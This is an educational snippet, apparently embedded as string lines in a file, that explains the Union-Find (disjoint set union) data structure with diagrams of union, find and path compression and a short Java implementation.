    "## Union-Find (Disjoint Set Union — DSU)",
    "",
    "```",
    "PROBLEM: Given a graph with edges added one at a time,",
    "  'Are nodes A and B in the same connected component?'",
    "  'Does adding this edge create a cycle?'",
    "",
    "Union-Find maintains groups (sets) of elements.",
    "Two operations: find(x) = which group is x in? union(x, y) = merge groups.",
    "",
    "Visual:",
    "  Initial: {1} {2} {3} {4} {5}    (each node is its own group)",
    "",
    "  union(1, 2): {1,2} {3} {4} {5}",
    "  union(2, 3): {1,2,3} {4} {5}",
    "  union(4, 5): {1,2,3} {4,5}",
    "",
    "  find(1) == find(3)?  YES (same component)",
    "  find(1) == find(4)?  NO  (different components)",
    "",
    "OPTIMISATIONS (make both operations nearly O(1)):",
    "  1. Union by rank: attach smaller tree under larger tree",
    "  2. Path compression: find() flattens tree as it traverses",
    "",
    "  Path compression:",
    "    Before: 1 → 2 → 3 → 4 (root)",
    "    find(1) traverses to root (4)",
    "    After: 1 → 4, 2 → 4, 3 → 4  (all point directly to root)",
    "    Next find(1): O(1) — directly to root",
    "",
    "Time: O(α(n)) per operation — inverse Ackermann, effectively O(1)",
    "```",
    "",
    "```java",
    "class UnionFind {",
    "    int[] parent, rank;",
    "",
    "    UnionFind(int n) {",
    "        parent = new int[n];",
    "        rank = new int[n];",
    "        for (int i = 0; i < n; i++) parent[i] = i;",
    "    }",
    "",
    "    int find(int x) {",
    "        if (parent[x] != x)",
    "            parent[x] = find(parent[x]);  // path compression",
    "        return parent[x];",
    "    }",
    "",
    "    boolean union(int x, int y) {",
    "        int px = find(x), py = find(y);",
    "        if (px == py) return false;  // already same component (cycle!)",
    "        if (rank[px] < rank[py]) { int t = px; px = py; py = t; }",
    "        parent[py] = px;",
    "        if (rank[px] == rank[py]) rank[px]++;",
    "        return true;",
    "    }",
    "}",
    "```",
